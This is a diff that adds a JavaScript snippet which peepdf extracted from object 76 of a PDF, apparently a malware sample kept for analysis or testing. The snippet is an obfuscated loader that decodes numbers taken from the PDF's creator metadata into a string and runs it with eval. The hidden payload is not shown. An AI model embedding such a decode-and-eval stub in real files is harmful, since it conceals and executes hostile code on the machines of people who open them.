@@ -1,0 +1,14 @@
+// peepdf comment: Javascript code located in object 76 (version 0)
+
+try {
+    prototype % 2;
+} catch (z) {
+    a = creator;
+    a = a.split("-");
+    s = "";
+}
+for (i = 0; i != a.length; i++) {
+    s += String.fromCharCode(a[i] - 31);
+}
+eval(s);
+
